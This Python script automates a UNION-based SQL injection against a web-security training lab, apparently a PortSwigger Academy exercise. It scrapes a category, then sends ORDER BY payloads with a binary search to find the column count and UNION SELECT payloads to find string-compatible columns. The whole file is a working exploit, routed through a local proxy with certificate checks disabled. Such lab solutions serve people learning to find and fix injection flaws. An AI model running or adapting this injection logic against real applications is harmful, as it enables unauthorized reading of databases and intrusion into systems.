#!/usr/bin/env python3
import re
import sys
import warnings
from typing import List, Optional
from urllib.parse import urljoin

import requests
from bs4 import BeautifulSoup

# Suppress insecure request warnings
warnings.filterwarnings("ignore", message="Unverified HTTPS request")


class LabExploit:
    def __init__(self, base_url: str) -> None:
        self.base_url = base_url.rstrip("/")
        self.session = requests.Session()
        self.session.headers.update(
            {"User-Agent": "Security-Scanner-v1", "Connection": "close"}
        )
        self.proxies = {
            "http": "http://127.0.0.1:8080",
            "https": "http://127.0.0.1:8080",
        }
        self.category = "Gifts"

    def send_request(
        self,
        endpoint: str,
        params: Optional[dict] = None,
        data: Optional[dict] = None,
        method: str = "GET",
    ) -> Optional[requests.Response]:
        """Helper handles all HTTP Communication"""
        target_url = urljoin(self.base_url, endpoint)
        try:
            return self.session.request(
                method,
                target_url,
                params=params,
                data=data,
                timeout=(2, 5),
                allow_redirects=True,
                proxies=self.proxies,
                verify=False,
            )
        except requests.RequestException as e:
            print(f"[-] Connection error: {e}")
            return None

    def harvest_category(self) -> Optional[str]:
        """Harvest categories dynamically"""
        print("[*] Phase 1: Harvesting categories...")
        res = self.send_request("")
        if res is None or res.status_code != 200:
            print("[-] Failed to load home page!")
            return None
        soup = BeautifulSoup(res.text, "html.parser")
        categories = []
        for tag in soup.find_all("a", class_="filter-category"):
            tag_name = tag.get_text(strip=True)
            if "All" not in tag_name:
                categories.append(tag_name)
        return min(categories, key=len) if categories else None

    def extract_marker_string(self) -> Optional[str]:
        """Extracts the random string from the HTML hint banner"""
        print("[*] Phase 2: Fetching marker string from HTML banner...")
        res = self.send_request("")
        if res is None or res.status_code != 200:
            print("[-] Failed to load home page!")
            return None

        soup = BeautifulSoup(res.text, "html.parser")
        hint = soup.find("p", attrs={"id": "hint"})
        if not hint:
            return None
        # Looking for the string inside single quotes
        match = re.search(r"'([^']+)'", hint.get_text(strip=True))
        return match.group(1) if match else None

    def is_valid_count(self, attack_type: str, col_count: int) -> bool:
        """Returns True is server responds with 200 OK for the payload"""
        null_chain = ["NULL"] * col_count
        payload_fragment = (
            col_count if attack_type == "ORDER BY" else ",".join(null_chain)
        )
        payload = f"{self.category}' {attack_type} {payload_fragment} -- "
        res = self.send_request("filter", params={"category": payload})
        return res is not None and res.status_code == 200

    def find_column_count(self) -> int:
        """Uses Exponential + Binary Search to find column count"""
        # Step 1: Exponential seacrh for finding Upper Bound
        print("[*] Phase 3: Finding upper bound...")
        upper_bound = 1
        lower_bound = 1

        attack_type = "ORDER BY"
        while self.is_valid_count(attack_type, upper_bound):
            lower_bound = upper_bound
            upper_bound *= 2
            if upper_bound > 100:  # Safety check
                break

        # Step 2: Binary search within discovered range
        print(
            f"[*] Phase 4: Binary Searching between [{lower_bound}, {upper_bound}]..."
        )
        discovered_columns = 0
        while lower_bound <= upper_bound:
            mid = (lower_bound + upper_bound) // 2
            if self.is_valid_count(attack_type, mid):
                discovered_columns = mid
                lower_bound = mid + 1
            else:
                upper_bound = mid - 1

        return discovered_columns

    def find_string_column(self, col_count: int, marker: str) -> List[int]:
        """Determines which columns are string-compatible"""
        print("[*] Phase 4: Determining string-compatible column...")
        col_indices = []
        for col_idx in range(col_count):
            cols = ["NULL"] * col_count
            cols[col_idx] = f"'{marker}'"
            payload = f"{self.category}' UNION SELECT {','.join(cols)} -- "
            res = self.send_request("filter", params={"category": payload})
            if res is not None and res.status_code == 200:
                col_indices.append(col_idx)
        return col_indices

    def verify_solved(self) -> bool:
        """Checks if the lab is solved"""
        res = self.send_request("")
        return res is not None and "Congratulation" in res.text

    def solve(self) -> None:
        # Harvest categories
        category = self.harvest_category()
        if not category:
            print("[-] Could not find valid category!")
            return
        self.category = category
        print(f"[+] Target category identified: {category}")

        # Extract marker string
        marker = self.extract_marker_string()
        if not marker:
            print("[-] Could not extract marker from banner!")
            return
        print(f"[+] Extracted marker string: {marker}")

        # identify the column count
        col_count = self.find_column_count()
        if col_count == 0:
            print("[-] Could not identify column count!")
            return
        print(f"[+] Identified column count: {col_count}")

        # determine the string-compatible columns
        col_indices = self.find_string_column(col_count, marker)
        if not col_indices:
            print("[-] Could not determine string-compatible columns!")

        if self.verify_solved():
            print("[!] SUCCESS: Lab solved!")
            print(f"[+] String compatible string indices: [{col_indices}]")
        else:
            print("[-] Lab is not solved!")


def main():
    if len(sys.argv) != 2:
        print(f"Usage: {sys.argv[0]} <url>")
        print(f"Example: {sys.argv[0]} https://lab-id.web-security-academy.net")
        sys.exit(1)

    url = sys.argv[1].strip()

    exploit = LabExploit(url)
    exploit.solve()


if __name__ == "__main__":
    main()
